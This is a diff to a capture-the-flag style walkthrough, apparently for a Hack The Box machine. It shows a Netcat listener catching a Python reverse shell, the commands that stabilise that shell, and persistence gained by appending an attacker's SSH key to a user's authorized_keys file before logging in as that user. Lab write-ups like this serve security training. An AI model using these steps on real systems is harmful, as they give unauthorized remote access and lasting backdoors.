@@ -232,7 +232,7 @@ Let's set up a Netcat listener first:
 nc -lvnp 4444
 ```
 
-Next, we will generate a Python3 reverse shell using RevShells and execute the code within the Python console:
+Next, we will generate a Python3 reverse shell using RevShells.com and execute the code within the Python console:
 
 <img src="Images/28-revshell.png" width="600">
 
@@ -246,3 +246,35 @@ Connection received on 10.129.245.216 59334
 analyst@devhub:~/notebooks$
 ```
 
+Again, we will stablise the shell:
+
+```bash
+python3 -c ‘import pty;pty.spawn(“/bin/bash”)’
+export TERM=xterm
+ctrl-z
+stty raw -echo; fg
+```
+
+And again, we will set Analyst's authorized_keys file to contain our attacker's public SSH key:
+
+```
+ssh-keygen
+```
+
+#### Writing to authorized_keys:
+
+```
+echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA19Tw8D/Jv2ecF1vmaK946E5bhE9Ne9UeehFJ08wB4W root@htb-c6lz08re7g" >> /home/analyst/.ssh/authorized_keys
+```
+
+#### Logging in as Analyst:
+
+```
+ssh -i /root/.ssh/id_ed25519 analyst@10.129.245.216
+```
+
+#### Output:
+
+```
+analyst@devhub:~$
+```
